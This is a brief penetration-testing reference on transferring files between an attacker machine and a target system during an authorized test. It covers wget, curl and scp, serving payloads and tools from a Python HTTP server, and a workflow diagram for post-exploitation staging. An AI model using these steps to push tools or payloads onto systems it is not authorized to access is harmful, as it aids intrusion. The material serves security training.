# File Transfer

## Overview

File transfer is an important technique during penetration testing for moving tools, scripts, payloads, and other files between the attacker machine and a target system.

This section covers common methods for transferring files between systems using command-line utilities and network services.

## Topics Covered

- File Transfer Fundamentals
- Downloading Files
- Uploading Files
- `wget`
- `curl`
- `scp`
- HTTP File Transfer
- Secure File Transfer

## Commands

### Download Files

Using `wget`:

```bash
# Download a file from a web server
wget http://<IP>/<file>
```

Using `curl`:

```bash
# Download a file and save it with a specified filename
curl http://<IP>/<file> -o <file>
```

### Transfer Files with SCP

Copy a local file to a remote system:

```bash
scp <file> <user>@<IP>:/tmp/
```

Copy a file from a remote system:

```bash
scp <user>@<IP>:/path/to/file .
```

### HTTP File Transfer

A simple HTTP server can be used in an authorized lab environment to make files available to a target system.

```bash
# Start a Python HTTP server
python3 -m http.server 8000
```

The target can then retrieve a file using:

```bash
wget http://<IP>:8000/<file>
```

or:

```bash
curl http://<IP>:8000/<file> -o <file>
```

## File Transfer Workflow

```text
Attacker Machine
      ↓
Prepare File
      ↓
Start Transfer Service
      ↓
Target Connects
      ↓
Upload / Download File
      ↓
Verify Transfer
      ↓
Use File During Assessment
```

## Purpose

The purpose of this section is to understand common methods for transferring files between systems during an authorized penetration test.

File transfer is commonly required during exploitation and post-exploitation to move scripts, tools, or other files between the attacker and target systems.